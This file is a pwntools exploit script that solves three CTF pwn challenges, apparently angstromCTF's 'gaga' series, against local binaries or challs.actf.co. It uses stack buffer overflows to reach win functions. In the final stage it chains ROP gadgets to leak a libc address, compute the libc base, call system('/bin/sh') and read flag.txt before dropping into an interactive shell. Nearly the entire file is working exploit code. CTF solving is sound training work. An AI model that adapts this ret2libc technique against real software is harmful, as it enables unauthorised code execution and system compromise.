#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

### 1st gaga ###
chall = "./gaga0"
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.actf.co", 31300)
else:
    p = process(chall)

p.recvuntil("address ")
win0_addr = eval(p.recv(8))
log.info("win0: " + hex(win0_addr))
payload = b"A" * 8 * 9
payload += p64(win0_addr)

p.recvuntil(":")
p.sendline(payload)

flag_part_1 = p.recvline().rstrip(b'\n')

log.info("flag 1: " + str(flag_part_1))

### 2nd gaga ###
chall = "./gaga1"
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.actf.co", 31301)
else:
    p = process(chall)

win1_addr = elf.symbols['win1']
bss_addr = elf.get_section_by_name('.bss').header.sh_addr
payload = b"A" * 8 * 8
payload += p64(bss_addr + 0x100)
payload += p64(win1_addr+51)

p.recvuntil(":")
p.sendline(payload)

flag_part_2 = p.recvline().rstrip(b'\n')
log.info("flag 2: " + str(flag_part_2))

### 3rd gaga ###
chall = "./gaga2"
elf = ELF(chall)
libc = ELF("libc.so.6")
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.actf.co", 31302)
elif len(argv) >= 2 and argv[1] == "d":
    cmd = """
        b *main+116
        c
    """
    p = gdb.debug(chall,cmd)
else:
    p = process(chall)

rop_pop_rdi_ret = 0x004012b3
rop_ret = 0x004012d4

payload = b"A" * 8 * 9
payload += p64(rop_pop_rdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.recvuntil(":")
p.sendline(payload)
p.recv(6)
leak = u64(p.recv(6) + b'\0' * 2)
log.info("puts@libc: " + hex(leak))
libc_base = leak - libc.symbols['puts']
libc.address = libc_base
log.info("libc base: " + hex(libc_base))
system_libc_addr = libc.symbols["system"]

payload = b"A" * 8 * 9
payload += p64(rop_ret)
payload += p64(rop_pop_rdi_ret)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(system_libc_addr)

p.recvuntil(":")
p.sendline(payload)
p.sendline("cat flag.txt")

flag_part_3 = p.recvline().rstrip()
log.info("flag 3: " + str(flag_part_3))

flag = (flag_part_1 + flag_part_2 + flag_part_3).decode()
log.info("Flag: " + flag)

p.interactive()
